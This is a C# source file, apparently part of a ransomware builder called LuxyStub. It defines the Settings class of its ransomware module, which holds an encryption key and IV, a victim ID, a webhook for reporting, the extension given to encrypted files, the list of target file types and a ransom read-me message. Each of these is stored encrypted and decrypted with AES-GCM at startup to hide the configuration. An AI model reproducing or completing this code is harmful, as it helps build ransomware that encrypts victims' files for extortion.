using System;
using System.Linq;
using System.Text;
using LuxyStub.Components.Algorithms;

namespace LuxyStub.Modules.Ransomware
{
    internal static class Settings
    {
        internal static byte[] EncryptKey { get; set; }
        internal static byte[] EncryptIV { get; set; }
        internal static string PersonalID { get; set; }
        internal static string Webhook { get; set; }
        internal static string EncryptExtension { get; set; }
        internal static string[] EncryptExtensionList { get; set; }
        internal static string ReadMeMessage { get; set; }
        internal static bool ShowReadMeMessage { get; set; }

        static Settings()
        {
            var key = "";
            var iv = "";

            var encryptedWebhook = "";

            var encryptedEncryptExtension = "";
            var encryptedStrEncryptExtensionList = "";
            var encryptedReadMeMessage = "";

            var showreadmemessage = true;

            // ---------------- Initialise variables ----------------

            var conv_key = Convert.FromBase64String(key);
            var conv_iv = Convert.FromBase64String(iv);
            Webhook = Decrypt(Convert.FromBase64String(encryptedWebhook), conv_key, conv_iv);

            EncryptExtension = Decrypt(Convert.FromBase64String(encryptedEncryptExtension), conv_key, conv_iv);
            EncryptExtensionList = Decrypt(Convert.FromBase64String(encryptedStrEncryptExtensionList), conv_key, conv_iv).Split(',');
            ReadMeMessage = Decrypt(Convert.FromBase64String(encryptedReadMeMessage), conv_key, conv_iv);
            ShowReadMeMessage = showreadmemessage;

        }

        static string Decrypt(byte[] encryptedData, byte[] key, byte[] iv)
        {

            var cipherText = encryptedData.Take(encryptedData.Length - 16).ToArray();
            var tag = encryptedData.Skip(encryptedData.Length - 16).ToArray();

            var aesgcm = new AesGcm();
            var decrypted = aesgcm.Decrypt(key, iv, null, cipherText, tag);

            return Encoding.UTF8.GetString(decrypted);
        }
    }
}
